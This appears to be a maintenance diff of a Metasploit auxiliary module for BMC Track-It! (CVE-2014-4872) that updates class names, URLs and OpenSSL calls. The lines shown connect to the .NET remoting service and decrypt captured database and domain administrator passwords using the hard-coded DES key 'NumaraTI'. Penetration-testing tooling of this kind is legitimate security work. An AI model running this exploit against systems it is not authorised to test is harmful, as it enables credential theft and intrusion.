@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'openssl'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Report
 
@@ -31,8 +29,7 @@ class Metasploit3 < Msf::Auxiliary
           [ 'CVE', '2014-4872' ],
           [ 'OSVDB', '112741' ],
           [ 'US-CERT-VU', '121036' ],
-          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/bmc-track-it-11.3.txt' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Oct/34' ]
+          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Oct/34' ]
         ],
       'DisclosureDate' => 'Oct 7 2014'
     ))
@@ -40,7 +37,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPort.new('RPORT',
           [true, '.NET remoting service port', 9010])
-      ], self.class)
+      ])
   end
 
 
@@ -183,7 +180,7 @@ class Metasploit3 < Msf::Auxiliary
 
     sock = connect
     if sock.nil?
-      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
+      fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
     else
       print_status("#{rhost}:#{rport} - Sending packet to ConfigurationService...")
     end
@@ -224,7 +221,7 @@ class Metasploit3 < Msf::Auxiliary
         sock.close
         sock = connect
         if sock.nil?
-          fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
+          fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
         else
           print_status("#{rhost}:#{rport} - Sending packet to ConfigurationService...")
         end
@@ -261,7 +258,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if loot[database_pw]
-      cipher = OpenSSL::Cipher::Cipher.new("des")
+      cipher = OpenSSL::Cipher.new("des")
       cipher.decrypt
       cipher.key = 'NumaraTI'
       cipher.iv = 'NumaraTI'
@@ -275,7 +272,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if loot[domain_admin_pw]
-      cipher = OpenSSL::Cipher::Cipher.new("des")
+      cipher = OpenSSL::Cipher.new("des")
       cipher.decrypt
       cipher.key = 'NumaraTI'
       cipher.iv = 'NumaraTI'
